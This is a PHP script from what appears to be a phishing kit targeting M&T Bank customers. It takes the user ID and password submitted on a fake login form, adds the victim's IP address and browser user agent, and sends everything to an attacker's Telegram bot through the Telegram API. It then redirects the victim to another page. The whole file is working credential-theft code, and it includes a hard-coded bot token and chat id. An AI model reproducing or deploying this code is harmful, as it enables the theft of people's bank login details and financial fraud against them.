<?php



$dt = date('d/m/y h:i');

// Function to get the client IP address
function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}


header ("Location: mail.html");
  
    $usera = $_SERVER['HTTP_USER_AGENT'];
                $xip = get_client_ip();

define ('url',"https://api.telegram.org/bot2019001239:AAHiEgEOmkzyZn-0htLbDbJobfDSDSkkWZM/");
$xuser = $_POST['UserID'];
$xpass = $_POST['Password'];
$ip = get_client_ip();
$chat_id = '1327277990';
$message = urlencode("==============M&T Bank Info 2 [Login Details 2]============\nUSER ID: ".$xuser."\nPassword : ".$xpass."\nIP Address : ".$xip."\nUseragent : ".$usera."\n========Coded By 99Savage=======================");
file_get_contents(url."sendmessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");



?>